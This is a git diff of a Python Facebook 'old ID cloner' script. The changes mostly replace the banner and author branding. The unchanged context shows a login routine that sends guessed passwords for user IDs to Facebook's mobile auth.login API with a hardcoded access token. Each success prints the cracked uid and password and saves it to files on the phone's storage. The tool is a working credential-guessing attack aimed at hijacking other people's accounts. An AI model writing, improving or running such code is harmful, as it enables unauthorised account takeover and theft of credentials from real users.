@@ -60,18 +60,13 @@ logo = (f"""
 \033[0;99m                     OOb"                                  
    
                                                                                                                    
-\033[1;32m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[1;32m        [ JAI ◈✙◈ \33[1;33mSHREE ◈✙◈\33[1;37m RAAM  ]          ║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-\033[1;33m(•)●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;35m๑۩♡۩๑\033[0;95m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●💔
-\033[1;36m[•] ━▷ \033[1;31mCREATED BY   ◈✙◈  \033[1;31mOWNER PRINCE
-\033[1;32m[•] ━▷ \033[1;36mFACEBOK      ◈✙◈  \033[1;36mPRINCE ONFIRE
-\033[1;37m[•] ━▷ \033[1;37mGITHUB       ◈✙◈  \033[1;37mPRINCE-KING
-\033[1;33m[•] ━▷ \033[1;32mSTATUS       ◈✙◈  \033[1;32mTOOL IS ALWAYS FREE
-\033[1;35m[•] ━▷ \033[1;35mDOGLE      ◈✙◈  \033[1;35m LODE PAR
-\033[1;32m[•] ━▷ \033[1;33mCLONER   ◈✙◈  \033[1;33mKING
-\033[1;37m[•] ━▷ \033[1;32mWHATSAPP.    ◈✙◈  \033[1;37m95\033[1;36m09\033[1;32m34\033[1;33m30\033[1;35m45 
-\033[1;37m(•)●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;35m๑۩♡۩๑\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●💔\n\n"""  
+\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
+\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92  PRINCE 
+[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mPRINCE ONFIRE
+[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mOLD ID
+[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92m𝙵𝚁𝙴𝙴 
+[\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32m𝚅1\033[1;35m]
+\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═""")
 #----------------------------[MAIN/DEF]-----------------------------------#
 def main():
     user=[]
@@ -126,18 +121,18 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
             if "session_key" in rp:
-                print(f"\r\r{G}AYUSH😊OK {A}➤ {G}{uid} {A}•{G} {pw}")
+                print(f"\r\r{G}PR||NC3😈0K {A}➤ {G}{uid} {A}•{G} {pw}")
                 open("/sdcard/VISHAL-OLD-OK","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r{G}AYUSH😊OK {A}➤ {G}{uid} {A}•{G} {pw}")
+                print(f"\r\r{G}PR||NC3😈0K {A}➤ {G}{uid} {A}•{G} {pw}")
                 open("/sdcard/VISHAL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in str(rp):
-                print(f"\r\r{G}AYUSH-OK {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/AYUSH-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r{G}PR||NC3-OK {A}➤ {G}{uid} {A}•{G} {pw}")
+                open("/sdcard/PRINCE-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -182,4 +177,4 @@ def Subscraption():
 		os.system('am start https://wa.me/+923344706269?text=' + tks)
 		Subscraption()        
 Subscraption()
-#----------------------------[CODE/END]-----------------------------------
+#----------------------------[CODE/END]-----------------------------------#
